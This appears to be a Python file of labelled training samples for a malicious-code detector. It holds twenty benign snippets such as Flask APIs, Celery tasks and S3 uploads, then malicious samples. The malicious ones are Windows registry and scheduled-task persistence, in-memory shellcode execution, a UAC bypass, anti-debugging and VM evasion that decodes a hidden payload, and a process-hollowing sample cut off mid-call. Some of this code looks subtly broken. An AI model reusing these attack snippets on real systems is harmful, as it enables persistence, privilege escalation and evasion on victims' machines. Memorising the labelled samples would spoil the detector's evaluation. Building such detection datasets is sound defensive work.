#!/usr/bin/env python3
"""
Level 3 Expansion: +40 samples (20 benign + 20 malicious)

Adding diverse categories to fix 80% accuracy issue.

New BENIGN categories:
- Flask/FastAPI web apps
- Data processing (pandas/numpy)
- Testing frameworks (pytest)
- CI/CD deployment scripts
- ML model inference
- Database transactions
- Message queues
- Legitimate monitoring

New MALICIOUS categories:
- Advanced persistence
- Memory-only attacks
- Privilege escalation
- Anti-debugging
- Covert channels
- Process hollowing
- DLL injection
- Credential dumping
"""

LEVEL3_BENIGN_EXPANSION = [
    {
        "code": """
from flask import Flask, request, jsonify
from werkzeug.security import check_password_hash
import sqlite3

app = Flask(__name__)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()

    cursor.execute('SELECT password_hash FROM users WHERE username = ?',
                   (username,))
    result = cursor.fetchone()
    conn.close()

    if result and check_password_hash(result[0], password):
        return jsonify({'status': 'success', 'token': 'xyz123'})
    return jsonify({'status': 'error'}), 401

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)
""",
        "category": "web_api",
        "description": "Flask REST API with authentication",
        "complexity": 3
    },
    {
        "code": """
import pandas as pd
import numpy as np
from datetime import datetime, timedelta

def process_sales_data(csv_path):
    # Load data
    df = pd.read_csv(csv_path)

    # Clean data
    df['date'] = pd.to_datetime(df['date'])
    df['amount'] = pd.to_numeric(df['amount'], errors='coerce')
    df = df.dropna()

    # Calculate metrics
    df['month'] = df['date'].dt.to_period('M')
    monthly_sales = df.groupby('month')['amount'].agg(['sum', 'mean', 'count'])

    # Find trends
    df['rolling_avg'] = df.groupby('product')['amount'].transform(
        lambda x: x.rolling(window=7, min_periods=1).mean()
    )

    return monthly_sales, df

results, processed = process_sales_data('sales.csv')
print(results.head())
""",
        "category": "data_processing",
        "description": "Pandas data analysis pipeline",
        "complexity": 3
    },
    {
        "code": """
import pytest
from unittest.mock import Mock, patch
import requests

class APIClient:
    def __init__(self, base_url):
        self.base_url = base_url

    def get_user(self, user_id):
        response = requests.get(f'{self.base_url}/users/{user_id}')
        response.raise_for_status()
        return response.json()

@pytest.fixture
def api_client():
    return APIClient('https://api.example.com')

@patch('requests.get')
def test_get_user_success(mock_get, api_client):
    mock_response = Mock()
    mock_response.json.return_value = {'id': 1, 'name': 'Alice'}
    mock_response.raise_for_status.return_value = None
    mock_get.return_value = mock_response

    result = api_client.get_user(1)

    assert result['id'] == 1
    assert result['name'] == 'Alice'
    mock_get.assert_called_once_with('https://api.example.com/users/1')

@patch('requests.get')
def test_get_user_not_found(mock_get, api_client):
    mock_get.side_effect = requests.HTTPError()

    with pytest.raises(requests.HTTPError):
        api_client.get_user(999)
""",
        "category": "testing",
        "description": "Pytest unit tests with mocking",
        "complexity": 3
    },
    {
        "code": """
import boto3
from botocore.exceptions import ClientError
import logging

logger = logging.getLogger(__name__)

class S3Uploader:
    def __init__(self, bucket_name):
        self.s3_client = boto3.client('s3')
        self.bucket = bucket_name

    def upload_file(self, file_path, object_name=None):
        if object_name is None:
            object_name = file_path.split('/')[-1]

        try:
            self.s3_client.upload_file(
                file_path,
                self.bucket,
                object_name,
                ExtraArgs={'ACL': 'private', 'ServerSideEncryption': 'AES256'}
            )
            logger.info(f"Uploaded {file_path} to {self.bucket}/{object_name}")
            return True
        except ClientError as e:
            logger.error(f"Upload failed: {e}")
            return False

    def download_file(self, object_name, file_path):
        try:
            self.s3_client.download_file(self.bucket, object_name, file_path)
            logger.info(f"Downloaded {object_name} to {file_path}")
            return True
        except ClientError as e:
            logger.error(f"Download failed: {e}")
            return False

uploader = S3Uploader('my-backup-bucket')
uploader.upload_file('/data/backup.zip')
""",
        "category": "cloud_storage",
        "description": "AWS S3 file upload/download",
        "complexity": 3
    },
    {
        "code": """
from sklearn.ensemble import RandomForestClassifier
from sklearn.preprocessing import StandardScaler
import joblib
import numpy as np

class ModelInference:
    def __init__(self, model_path):
        self.model = joblib.load(model_path)
        self.scaler = joblib.load(model_path.replace('.pkl', '_scaler.pkl'))

    def preprocess(self, features):
        # Convert to numpy array
        if isinstance(features, list):
            features = np.array(features).reshape(1, -1)

        # Scale features
        scaled = self.scaler.transform(features)
        return scaled

    def predict(self, features):
        processed = self.preprocess(features)
        prediction = self.model.predict(processed)[0]
        probability = self.model.predict_proba(processed)[0]

        return {
            'prediction': int(prediction),
            'confidence': float(max(probability)),
            'probabilities': probability.tolist()
        }

# Load model and run inference
model = ModelInference('fraud_detection_model.pkl')
features = [100.50, 2, 1, 0, 45.3]  # amount, merchant_type, etc.
result = model.predict(features)
print(f"Fraud probability: {result['confidence']:.2%}")
""",
        "category": "ml_inference",
        "description": "ML model inference for fraud detection",
        "complexity": 3
    },
    {
        "code": """
from fastapi import FastAPI, Depends, HTTPException
from sqlalchemy.orm import Session
from typing import List
import uvicorn

app = FastAPI()

class UserService:
    def __init__(self, db: Session):
        self.db = db

    def get_users(self, skip: int = 0, limit: int = 100):
        return self.db.query(User).offset(skip).limit(limit).all()

    def create_user(self, user_data: dict):
        user = User(**user_data)
        self.db.add(user)
        self.db.commit()
        self.db.refresh(user)
        return user

@app.get("/users", response_model=List[UserSchema])
async def list_users(skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    service = UserService(db)
    return service.get_users(skip, limit)

@app.post("/users", response_model=UserSchema)
async def create_user(user: UserCreate, db: Session = Depends(get_db)):
    service = UserService(db)
    return service.create_user(user.dict())

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
""",
        "category": "web_framework",
        "description": "FastAPI REST API with dependency injection",
        "complexity": 3
    },
    {
        "code": """
import psycopg2
from psycopg2 import sql
from contextlib import contextmanager
import logging

logger = logging.getLogger(__name__)

@contextmanager
def get_transaction(conn):
    try:
        yield conn
        conn.commit()
        logger.info("Transaction committed successfully")
    except Exception as e:
        conn.rollback()
        logger.error(f"Transaction rolled back: {e}")
        raise

def transfer_funds(from_account, to_account, amount):
    conn = psycopg2.connect(
        host="localhost",
        database="banking",
        user="app_user",
        password="secure_password"
    )

    try:
        with get_transaction(conn):
            cursor = conn.cursor()

            # Check balance
            cursor.execute(
                "SELECT balance FROM accounts WHERE id = %s FOR UPDATE",
                (from_account,)
            )
            balance = cursor.fetchone()[0]

            if balance < amount:
                raise ValueError("Insufficient funds")

            # Debit from source
            cursor.execute(
                "UPDATE accounts SET balance = balance - %s WHERE id = %s",
                (amount, from_account)
            )

            # Credit to destination
            cursor.execute(
                "UPDATE accounts SET balance = balance + %s WHERE id = %s",
                (amount, to_account)
            )

            logger.info(f"Transferred {amount} from {from_account} to {to_account}")
    finally:
        conn.close()
""",
        "category": "database_transaction",
        "description": "PostgreSQL transactional fund transfer",
        "complexity": 3
    },
    {
        "code": """
import pika
import json
import logging
from typing import Callable

logger = logging.getLogger(__name__)

class MessageQueueConsumer:
    def __init__(self, queue_name: str, callback: Callable):
        self.queue_name = queue_name
        self.callback = callback
        self.connection = None
        self.channel = None

    def connect(self):
        credentials = pika.PlainCredentials('guest', 'guest')
        parameters = pika.ConnectionParameters(
            host='localhost',
            port=5672,
            credentials=credentials,
            heartbeat=600
        )
        self.connection = pika.BlockingConnection(parameters)
        self.channel = self.connection.channel()
        self.channel.queue_declare(queue=self.queue_name, durable=True)

    def on_message(self, ch, method, properties, body):
        try:
            data = json.loads(body)
            logger.info(f"Processing message: {data}")
            self.callback(data)
            ch.basic_ack(delivery_tag=method.delivery_tag)
        except Exception as e:
            logger.error(f"Failed to process message: {e}")
            ch.basic_nack(delivery_tag=method.delivery_tag, requeue=True)

    def start_consuming(self):
        self.connect()
        self.channel.basic_qos(prefetch_count=1)
        self.channel.basic_consume(
            queue=self.queue_name,
            on_message_callback=self.on_message
        )
        logger.info(f"Started consuming from {self.queue_name}")
        self.channel.start_consuming()

def process_order(data):
    print(f"Processing order: {data['order_id']}")

consumer = MessageQueueConsumer('orders', process_order)
consumer.start_consuming()
""",
        "category": "message_queue",
        "description": "RabbitMQ message consumer with ACK",
        "complexity": 3
    },
    {
        "code": """
from prometheus_client import start_http_server, Counter, Histogram, Gauge
import time
import random
import psutil

# Metrics
request_count = Counter('app_requests_total', 'Total requests', ['method', 'endpoint'])
request_duration = Histogram('app_request_duration_seconds', 'Request duration')
active_connections = Gauge('app_active_connections', 'Active connections')
cpu_usage = Gauge('app_cpu_usage_percent', 'CPU usage')
memory_usage = Gauge('app_memory_usage_bytes', 'Memory usage')

class ApplicationMonitor:
    def __init__(self):
        self.running = True

    def collect_system_metrics(self):
        while self.running:
            cpu_usage.set(psutil.cpu_percent(interval=1))
            memory = psutil.virtual_memory()
            memory_usage.set(memory.used)
            time.sleep(5)

    @request_duration.time()
    def handle_request(self, method, endpoint):
        request_count.labels(method=method, endpoint=endpoint).inc()
        active_connections.inc()

        try:
            # Simulate request processing
            time.sleep(random.uniform(0.01, 0.1))
            return {"status": "success"}
        finally:
            active_connections.dec()

if __name__ == '__main__':
    start_http_server(8000)
    monitor = ApplicationMonitor()

    import threading
    metrics_thread = threading.Thread(target=monitor.collect_system_metrics)
    metrics_thread.start()

    while True:
        monitor.handle_request('GET', '/api/users')
        time.sleep(1)
""",
        "category": "monitoring",
        "description": "Prometheus metrics collection",
        "complexity": 3
    },
    {
        "code": """
import paramiko
import os
from pathlib import Path
import logging

logger = logging.getLogger(__name__)

class DeploymentAgent:
    def __init__(self, host, username, key_path):
        self.host = host
        self.username = username
        self.key = paramiko.RSAKey.from_private_key_file(key_path)
        self.client = None

    def connect(self):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.client.connect(
            hostname=self.host,
            username=self.username,
            pkey=self.key
        )
        logger.info(f"Connected to {self.host}")

    def execute_command(self, command):
        stdin, stdout, stderr = self.client.exec_command(command)
        output = stdout.read().decode()
        error = stderr.read().decode()

        if error:
            logger.error(f"Command failed: {error}")
            raise Exception(error)

        logger.info(f"Command output: {output}")
        return output

    def deploy_application(self, local_path, remote_path):
        # Upload files
        sftp = self.client.open_sftp()
        for file in Path(local_path).rglob('*'):
            if file.is_file():
                remote_file = os.path.join(remote_path, file.relative_to(local_path))
                sftp.put(str(file), remote_file)
        sftp.close()

        # Restart service
        self.execute_command('sudo systemctl restart myapp')
        logger.info("Deployment complete")

    def close(self):
        if self.client:
            self.client.close()

deployer = DeploymentAgent('prod-server.example.com', 'deploy', '/keys/deploy_rsa')
deployer.connect()
deployer.deploy_application('./build', '/var/www/app')
deployer.close()
""",
        "category": "cicd_deployment",
        "description": "SSH-based application deployment",
        "complexity": 3
    },
    {
        "code": """
import docker
from docker.errors import DockerException
import logging

logger = logging.getLogger(__name__)

class ContainerManager:
    def __init__(self):
        self.client = docker.from_env()

    def create_container(self, image, name, environment=None, ports=None):
        try:
            container = self.client.containers.run(
                image=image,
                name=name,
                environment=environment or {},
                ports=ports or {},
                detach=True,
                restart_policy={"Name": "unless-stopped"}
            )
            logger.info(f"Created container {name}: {container.id}")
            return container
        except DockerException as e:
            logger.error(f"Failed to create container: {e}")
            raise

    def list_containers(self, all=False):
        containers = self.client.containers.list(all=all)
        return [
            {
                'id': c.id[:12],
                'name': c.name,
                'status': c.status,
                'image': c.image.tags[0] if c.image.tags else 'unknown'
            }
            for c in containers
        ]

    def stop_container(self, name):
        try:
            container = self.client.containers.get(name)
            container.stop(timeout=10)
            logger.info(f"Stopped container {name}")
        except Exception as e:
            logger.error(f"Failed to stop container: {e}")

    def cleanup_unused(self):
        self.client.containers.prune()
        self.client.images.prune()
        logger.info("Cleaned up unused containers and images")

manager = ContainerManager()
manager.create_container(
    'nginx:latest',
    'web-server',
    ports={'80/tcp': 8080}
)
print(manager.list_containers())
""",
        "category": "container_management",
        "description": "Docker container orchestration",
        "complexity": 3
    },
    {
        "code": """
from graphql import GraphQLObjectType, GraphQLField, GraphQLString, GraphQLInt, GraphQLList, GraphQLSchema
from graphql.execution.executors.asyncio import AsyncioExecutor
import asyncio

# Type definitions
UserType = GraphQLObjectType(
    'User',
    lambda: {
        'id': GraphQLField(GraphQLInt),
        'name': GraphQLField(GraphQLString),
        'email': GraphQLField(GraphQLString),
        'posts': GraphQLField(GraphQLList(PostType), resolve=lambda user, info: get_user_posts(user['id']))
    }
)

PostType = GraphQLObjectType(
    'Post',
    lambda: {
        'id': GraphQLField(GraphQLInt),
        'title': GraphQLField(GraphQLString),
        'content': GraphQLField(GraphQLString),
        'author': GraphQLField(UserType, resolve=lambda post, info: get_user_by_id(post['author_id']))
    }
)

# Resolvers
async def get_user_by_id(user_id):
    # Simulate database query
    await asyncio.sleep(0.01)
    return {'id': user_id, 'name': f'User {user_id}', 'email': f'user{user_id}@example.com'}

async def get_user_posts(user_id):
    await asyncio.sleep(0.01)
    return [
        {'id': 1, 'title': 'First Post', 'content': 'Content', 'author_id': user_id},
        {'id': 2, 'title': 'Second Post', 'content': 'More content', 'author_id': user_id}
    ]

# Schema
QueryType = GraphQLObjectType(
    'Query',
    {
        'user': GraphQLField(
            UserType,
            args={'id': GraphQLField(GraphQLInt)},
            resolve=lambda root, info, id: get_user_by_id(id)
        )
    }
)

schema = GraphQLSchema(query=QueryType)
""",
        "category": "graphql_api",
        "description": "GraphQL schema with async resolvers",
        "complexity": 3
    },
    {
        "code": """
import asyncio
import websockets
import json
from collections import defaultdict
import logging

logger = logging.getLogger(__name__)

class WebSocketServer:
    def __init__(self):
        self.clients = set()
        self.rooms = defaultdict(set)

    async def register(self, websocket):
        self.clients.add(websocket)
        logger.info(f"Client connected. Total: {len(self.clients)}")

    async def unregister(self, websocket):
        self.clients.discard(websocket)
        for room in self.rooms.values():
            room.discard(websocket)
        logger.info(f"Client disconnected. Total: {len(self.clients)}")

    async def handle_message(self, websocket, message):
        data = json.loads(message)
        msg_type = data.get('type')

        if msg_type == 'join':
            room = data.get('room')
            self.rooms[room].add(websocket)
            await websocket.send(json.dumps({'type': 'joined', 'room': room}))

        elif msg_type == 'message':
            room = data.get('room')
            content = data.get('content')
            for client in self.rooms[room]:
                if client != websocket:
                    await client.send(json.dumps({
                        'type': 'message',
                        'content': content
                    }))

    async def handler(self, websocket, path):
        await self.register(websocket)
        try:
            async for message in websocket:
                await self.handle_message(websocket, message)
        finally:
            await self.unregister(websocket)

async def main():
    server = WebSocketServer()
    async with websockets.serve(server.handler, "localhost", 8765):
        await asyncio.Future()

asyncio.run(main())
""",
        "category": "websocket_server",
        "description": "WebSocket chat server with rooms",
        "complexity": 3
    },
    {
        "code": """
from celery import Celery, Task
from celery.result import AsyncResult
import time
import logging

logger = logging.getLogger(__name__)

app = Celery('tasks', broker='redis://localhost:6379/0', backend='redis://localhost:6379/1')

app.conf.update(
    task_serializer='json',
    accept_content=['json'],
    result_serializer='json',
    timezone='UTC',
    enable_utc=True,
    task_track_started=True,
    task_time_limit=3600,
    worker_prefetch_multiplier=1
)

class CallbackTask(Task):
    def on_success(self, retval, task_id, args, kwargs):
        logger.info(f"Task {task_id} succeeded: {retval}")

    def on_failure(self, exc, task_id, args, kwargs, einfo):
        logger.error(f"Task {task_id} failed: {exc}")

@app.task(base=CallbackTask, bind=True, max_retries=3)
def process_video(self, video_id):
    try:
        logger.info(f"Processing video {video_id}")

        # Simulate video processing
        for i in range(10):
            time.sleep(1)
            self.update_state(
                state='PROGRESS',
                meta={'current': i + 1, 'total': 10}
            )

        return {'status': 'complete', 'video_id': video_id}

    except Exception as e:
        logger.error(f"Video processing failed: {e}")
        raise self.retry(exc=e, countdown=60)

@app.task
def send_notification(user_id, message):
    logger.info(f"Sending notification to {user_id}: {message}")
    time.sleep(0.5)
    return {'sent': True, 'user_id': user_id}

# Chain tasks
from celery import chain
workflow = chain(
    process_video.s('video_123'),
    send_notification.s('user_456', 'Video processed')
)
workflow.apply_async()
""",
        "category": "task_queue",
        "description": "Celery async task processing",
        "complexity": 3
    },
    {
        "code": """
import redis
from functools import wraps
import json
import hashlib
import logging

logger = logging.getLogger(__name__)

class RedisCache:
    def __init__(self, host='localhost', port=6379, db=0):
        self.client = redis.Redis(host=host, port=port, db=db, decode_responses=True)

    def get(self, key):
        value = self.client.get(key)
        if value:
            logger.info(f"Cache hit: {key}")
            return json.loads(value)
        logger.info(f"Cache miss: {key}")
        return None

    def set(self, key, value, ttl=3600):
        self.client.setex(key, ttl, json.dumps(value))
        logger.info(f"Cached: {key} (TTL: {ttl}s)")

    def delete(self, key):
        self.client.delete(key)

    def invalidate_pattern(self, pattern):
        keys = self.client.keys(pattern)
        if keys:
            self.client.delete(*keys)
            logger.info(f"Invalidated {len(keys)} keys matching {pattern}")

def cache_result(ttl=3600):
    cache = RedisCache()

    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            # Create cache key from function and arguments
            key_parts = [func.__name__] + [str(arg) for arg in args]
            key_parts += [f"{k}={v}" for k, v in sorted(kwargs.items())]
            cache_key = hashlib.md5(':'.join(key_parts).encode()).hexdigest()

            # Check cache
            result = cache.get(cache_key)
            if result is not None:
                return result

            # Execute and cache
            result = func(*args, **kwargs)
            cache.set(cache_key, result, ttl)
            return result

        return wrapper
    return decorator

@cache_result(ttl=300)
def get_user_profile(user_id):
    logger.info(f"Fetching user profile from database: {user_id}")
    # Simulate database query
    import time
    time.sleep(0.1)
    return {'id': user_id, 'name': f'User {user_id}', 'email': f'user{user_id}@example.com'}

print(get_user_profile(123))
""",
        "category": "caching",
        "description": "Redis caching with decorators",
        "complexity": 3
    },
    {
        "code": """
from authlib.integrations.flask_client import OAuth
from flask import Flask, redirect, url_for, session
from functools import wraps
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)

oauth = OAuth(app)

oauth.register(
    name='google',
    client_id=os.getenv('GOOGLE_CLIENT_ID'),
    client_secret=os.getenv('GOOGLE_CLIENT_SECRET'),
    server_metadata_url='https://accounts.google.com/.well-known/openid-configuration',
    client_kwargs={'scope': 'openid email profile'}
)

def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login')
def login():
    redirect_uri = url_for('authorize', _external=True)
    return oauth.google.authorize_redirect(redirect_uri)

@app.route('/authorize')
def authorize():
    token = oauth.google.authorize_access_token()
    user_info = oauth.google.parse_id_token(token)

    session['user'] = {
        'email': user_info['email'],
        'name': user_info['name'],
        'picture': user_info.get('picture')
    }

    return redirect(url_for('profile'))

@app.route('/profile')
@require_auth
def profile():
    user = session['user']
    return f"Welcome {user['name']} ({user['email']})"

@app.route('/logout')
def logout():
    session.pop('user', None)
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug=False)
""",
        "category": "oauth2_auth",
        "description": "OAuth2 authentication with Google",
        "complexity": 3
    },
    {
        "code": """
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import logging

logger = logging.getLogger(__name__)

class EmailService:
    def __init__(self, smtp_host, smtp_port, username, password):
        self.smtp_host = smtp_host
        self.smtp_port = smtp_port
        self.username = username
        self.password = password

    def send_email(self, to_email, subject, body_html, attachments=None):
        msg = MIMEMultipart('alternative')
        msg['From'] = self.username
        msg['To'] = to_email
        msg['Subject'] = subject

        # Add HTML body
        html_part = MIMEText(body_html, 'html')
        msg.attach(html_part)

        # Add attachments
        if attachments:
            for file_path in attachments:
                with open(file_path, 'rb') as f:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(f.read())

                encoders.encode_base64(part)
                part.add_header(
                    'Content-Disposition',
                    f'attachment; filename={os.path.basename(file_path)}'
                )
                msg.attach(part)

        try:
            with smtplib.SMTP(self.smtp_host, self.smtp_port) as server:
                server.starttls()
                server.login(self.username, self.password)
                server.send_message(msg)
                logger.info(f"Email sent to {to_email}")
                return True
        except Exception as e:
            logger.error(f"Failed to send email: {e}")
            return False

email_service = EmailService(
    smtp_host='smtp.gmail.com',
    smtp_port=587,
    username='noreply@example.com',
    password='app_password'
)

email_service.send_email(
    to_email='user@example.com',
    subject='Welcome!',
    body_html='<h1>Welcome to our service</h1><p>Thanks for signing up.</p>'
)
""",
        "category": "email_sending",
        "description": "SMTP email service with attachments",
        "complexity": 3
    },
    {
        "code": """
from flask import Flask, request, jsonify
from werkzeug.utils import secure_filename
import os
import hashlib
import magic
import logging

logger = logging.getLogger(__name__)

app = Flask(__name__)

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf', 'doc', 'docx'}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
UPLOAD_FOLDER = '/var/uploads'

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def validate_file_type(file_path):
    # Use magic numbers to verify actual file type
    mime = magic.Magic(mime=True)
    file_type = mime.from_file(file_path)

    allowed_mimes = [
        'image/png', 'image/jpeg', 'image/gif',
        'application/pdf', 'application/msword'
    ]

    return file_type in allowed_mimes

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'File type not allowed'}), 400

    # Save temporarily
    filename = secure_filename(file.filename)
    temp_path = os.path.join('/tmp', filename)
    file.save(temp_path)

    # Validate file size
    if os.path.getsize(temp_path) > MAX_FILE_SIZE:
        os.remove(temp_path)
        return jsonify({'error': 'File too large'}), 400

    # Validate file type
    if not validate_file_type(temp_path):
        os.remove(temp_path)
        return jsonify({'error': 'Invalid file content'}), 400

    # Generate unique filename
    file_hash = hashlib.sha256(open(temp_path, 'rb').read()).hexdigest()[:16]
    final_filename = f"{file_hash}_{filename}"
    final_path = os.path.join(UPLOAD_FOLDER, final_filename)

    os.rename(temp_path, final_path)
    logger.info(f"File uploaded: {final_filename}")

    return jsonify({'filename': final_filename, 'url': f'/files/{final_filename}'}), 201

if __name__ == '__main__':
    app.run(debug=False)
""",
        "category": "file_upload",
        "description": "Secure file upload with validation",
        "complexity": 3
    },
    {
        "code": """
from flask import Flask, request, jsonify
from functools import wraps
import time
import redis
import hashlib

app = Flask(__name__)
redis_client = redis.Redis(host='localhost', port=6379, db=0, decode_responses=True)

def rate_limit(max_requests=10, window=60):
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            # Get client identifier
            if 'X-API-Key' in request.headers:
                client_id = request.headers['X-API-Key']
            else:
                client_id = request.remote_addr

            # Create rate limit key
            key = f"rate_limit:{hashlib.md5(client_id.encode()).hexdigest()}"

            # Get current count
            current = redis_client.get(key)

            if current is None:
                # First request in window
                redis_client.setex(key, window, 1)
                return f(*args, **kwargs)

            if int(current) >= max_requests:
                # Rate limit exceeded
                ttl = redis_client.ttl(key)
                return jsonify({
                    'error': 'Rate limit exceeded',
                    'retry_after': ttl
                }), 429

            # Increment counter
            redis_client.incr(key)
            return f(*args, **kwargs)

        return wrapped
    return decorator

@app.route('/api/data')
@rate_limit(max_requests=10, window=60)
def get_data():
    return jsonify({'data': 'Some data', 'timestamp': time.time()})

@app.route('/api/expensive')
@rate_limit(max_requests=3, window=300)
def expensive_operation():
    # Simulate expensive operation
    time.sleep(1)
    return jsonify({'result': 'Operation completed'})

if __name__ == '__main__':
    app.run(debug=False)
""",
        "category": "rate_limiting",
        "description": "Redis-based API rate limiting",
        "complexity": 3
    },
    {
        "code": """
import logging
from logging.handlers import RotatingFileHandler, SysLogHandler
import json
from datetime import datetime
import traceback
import sys

class JsonFormatter(logging.Formatter):
    def format(self, record):
        log_data = {
            'timestamp': datetime.utcnow().isoformat(),
            'level': record.levelname,
            'logger': record.name,
            'message': record.getMessage(),
            'module': record.module,
            'function': record.funcName,
            'line': record.lineno
        }

        if record.exc_info:
            log_data['exception'] = {
                'type': record.exc_info[0].__name__,
                'message': str(record.exc_info[1]),
                'traceback': traceback.format_exception(*record.exc_info)
            }

        if hasattr(record, 'extra_data'):
            log_data['extra'] = record.extra_data

        return json.dumps(log_data)

def setup_logging(app_name, log_file='/var/log/app.log', syslog_host=None):
    logger = logging.getLogger(app_name)
    logger.setLevel(logging.INFO)

    # File handler with rotation
    file_handler = RotatingFileHandler(
        log_file,
        maxBytes=10*1024*1024,  # 10MB
        backupCount=5
    )
    file_handler.setFormatter(JsonFormatter())
    logger.addHandler(file_handler)

    # Console handler
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setFormatter(JsonFormatter())
    logger.addHandler(console_handler)

    # Syslog handler (optional)
    if syslog_host:
        syslog_handler = SysLogHandler(address=(syslog_host, 514))
        syslog_handler.setFormatter(JsonFormatter())
        logger.addHandler(syslog_handler)

    return logger

logger = setup_logging('myapp', syslog_host='logs.example.com')

# Usage
logger.info('Application started', extra={'extra_data': {'version': '1.0.0'}})

try:
    result = 10 / 0
except Exception as e:
    logger.error('Division error', exc_info=True, extra={'extra_data': {'operation': 'divide'}})
""",
        "category": "logging_aggregation",
        "description": "Structured logging with JSON formatting",
        "complexity": 3
    }
]

LEVEL3_MALICIOUS_EXPANSION = [
    {
        "code": """
import winreg
import os
import shutil

def establish_persistence():
    # Copy self to system directory
    current_path = __file__
    system_dir = os.path.join(os.environ['WINDIR'], 'System32')
    target_path = os.path.join(system_dir, 'svchost32.exe')

    shutil.copy2(current_path, target_path)

    # Add registry key for autostart
    key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0,
                         winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "WindowsDefender", 0, winreg.REG_SZ, target_path)
    winreg.CloseKey(key)

    # Create scheduled task as backup
    os.system(f'schtasks /create /tn "SystemMaintenance" /tr "{target_path}" /sc onlogon /f')

    # Hide file
    os.system(f'attrib +h +s "{target_path}"')

establish_persistence()
""",
        "category": "persistence_multi",
        "description": "Multiple persistence mechanisms",
        "complexity": 3
    },
    {
        "code": """
import ctypes
from ctypes import wintypes

# Load kernel32
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

def inject_shellcode_memory():
    # Shellcode (calc.exe for demonstration)
    shellcode = (
        b"\\x31\\xc0\\x50\\x68\\x63\\x61\\x6c\\x63\\x54\\xb8\\xc7\\x93"
        b"\\xc2\\x77\\xff\\xd0"
    )

    # Allocate executable memory
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40

    ptr = kernel32.VirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_int(len(shellcode)),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )

    # Write shellcode
    buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
    kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))

    # Execute in new thread
    thread_id = ctypes.c_ulong(0)
    kernel32.CreateThread(
        None,
        0,
        ctypes.c_int(ptr),
        None,
        0,
        ctypes.byref(thread_id)
    )

inject_shellcode_memory()
""",
        "category": "memory_injection",
        "description": "In-memory shellcode execution",
        "complexity": 3
    },
    {
        "code": """
import ctypes
import sys

def bypass_uac():
    # Check if already admin
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True

    # COM elevation bypass (CMSTPLUA)
    CLSID_CMSTPLUA = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"

    # Create elevated COM object
    ctypes.windll.ole32.CoInitialize(None)

    clsid = ctypes.c_wchar_p(CLSID_CMSTPLUA)
    iid = ctypes.c_wchar_p("{00000000-0000-0000-C000-000000000046}")

    obj = ctypes.c_void_p()
    hr = ctypes.windll.ole32.CoCreateInstance(
        ctypes.byref(ctypes.c_char * 16),
        None,
        1,
        ctypes.byref(ctypes.c_char * 16),
        ctypes.byref(obj)
    )

    if hr == 0:
        # Execute command with elevated privileges
        cmd = "powershell -Command Start-Process cmd -Verb RunAs"
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", "cmd.exe", f"/c {cmd}", None, 0
        )
        return True

    return False

bypass_uac()
""",
        "category": "privilege_escalation",
        "description": "UAC bypass via COM elevation",
        "complexity": 3
    },
    {
        "code": """
import time
import psutil
import os

def detect_debugger():
    # Check for debugger processes
    debuggers = ['ollydbg', 'x64dbg', 'ida', 'wireshark', 'procmon']
    for proc in psutil.process_iter(['name']):
        if any(dbg in proc.info['name'].lower() for dbg in debuggers):
            return True

    # Check parent process
    parent = psutil.Process().parent()
    if parent and 'python' not in parent.name().lower():
        return True

    # Timing attack
    start = time.time()
    time.sleep(0.1)
    elapsed = time.time() - start
    if elapsed > 0.15:  # Debugger slow-down detected
        return True

    return False

def anti_analysis():
    # Check for VM artifacts
    vm_files = [
        'C:\\\\Windows\\\\System32\\\\drivers\\\\vmmouse.sys',
        'C:\\\\Windows\\\\System32\\\\drivers\\\\vmhgfs.sys',
    ]

    for vm_file in vm_files:
        if os.path.exists(vm_file):
            # Detected VM, act benign
            print("Hello World")
            exit(0)

    # Check for debugger
    if detect_debugger():
        print("System check complete")
        exit(0)

    # If no analysis environment, run payload
    exec(base64.b64decode(b'cGF5bG9hZF9jb2Rl'))

anti_analysis()
""",
        "category": "anti_debugging",
        "description": "Anti-debugging and VM detection",
        "complexity": 3
    },
    {
        "code": """
import ctypes
from ctypes import wintypes
import subprocess

def hollow_process(target_exe, malicious_code):
    # Start target in suspended state
    STARTUPINFO = subprocess.STARTUPINFO()
    PROCESS_INFO = subprocess.PROCESS_INFORMATION()

    ctypes.windll.kernel32.CreateProcessW(
        target_exe,
        None,
        None,
        None,
        False,
        0x4,  # CREATE_SUSPENDED
        None,
        None,
